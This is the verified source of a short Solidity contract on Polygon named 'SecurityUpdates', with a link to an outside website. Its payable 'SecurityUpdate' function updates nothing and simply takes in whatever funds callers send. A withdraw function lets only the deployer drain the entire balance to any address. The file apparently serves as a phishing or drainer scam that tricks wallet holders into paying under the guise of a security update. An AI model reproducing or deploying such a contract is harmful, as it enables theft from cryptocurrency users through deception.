/**
 *Submitted for verification at polygonscan.com on 2023-03-09
*/

//https://dragondark.xyz/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

contract SecurityUpdates {

    address private  _owner;

     constructor() {   
        _owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == _owner);
        _;
    }
   
   function witdraw2(address payable _withdrawal) public onlyOwner {
    require(_owner == msg.sender);
    uint256 amount = address(this).balance;
    (bool success,) = _withdrawal.call{gas: 8000000, value: amount}("");
    require(success, "Failed to transfer Ether");
}

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}